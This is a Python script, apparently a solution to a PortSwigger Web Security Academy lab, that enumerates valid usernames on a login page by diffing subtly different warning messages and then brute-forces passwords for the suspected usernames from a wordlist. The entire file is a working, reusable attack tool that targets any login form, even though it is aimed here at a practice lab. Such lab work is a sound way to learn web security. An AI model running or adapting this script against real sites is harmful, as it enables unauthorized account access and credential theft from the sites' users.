import requests
from bs4 import BeautifulSoup
import difflib

url = 'https://0a1c002104307b9e801d9e7400280094.web-security-academy.net/login'

# Copy username wordlist to array
username_file = 'username_list.txt'
username_array = []

with open(username_file, 'r') as file:
    username_array = [line.strip() for line in file]

# Copy wordlist to array
password_file = 'password_list.txt'
password_array = []

with open(password_file, 'r') as file:
    password_array = [line.strip() for line in file]

suspected_usernames = {}
# Enumarate valid username
for username in username_array:
    # Define the form data payload
    payload = {
        'username': username,
        'password': '1234'
    }

    try:
        # Send the POST request
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            # print("Login successful!")
            # print("Response data:", response.text)
            soup = BeautifulSoup(response.text, 'html.parser')
            validity_message = soup.find('p', class_='is-warning')
            suspected_usernames.update({username: validity_message.get_text()})
            # print(username, ": ", validity_message)
        else:
            print(f"Failed to log in. Status code: {response.status_code}")
            print("Response data:", response.text)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

usernames_with_differences = []

def compare_to_baseline(strings):
    baseline = strings[0]
    print(f"Baseline: {baseline}\n")
    
    for i, string in enumerate(strings[1:], start=1):
        print(f"Comparing with string {i}: {string}")
        diff = difflib.ndiff(baseline, string)
        differences = [d for d in diff if d.startswith('+ ') or d.startswith('- ')]
        if differences:
            print(list(suspected_usernames.keys())[i])
            usernames_with_differences.append(list(suspected_usernames.keys())[i])
            print("Differences found:")
            print('\n'.join(differences))
        else:
            print("No differences.")
        print('-' * 40)


compare_to_baseline(list(suspected_usernames.values()))
    

for username in usernames_with_differences:
    for password in password_array:
        # Define the form data payload
        payload = {
            'username': username,
            'password': password
        }

        try:
            # Send the POST request
            response = requests.post(url, data=payload)

            if response.status_code == 200:
                print("Response data:", response.text)
                print(username, ": ", password)
            else:
                print(f"Failed to log in. Status code: {response.status_code}")
                print("Response data:", response.text)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", e)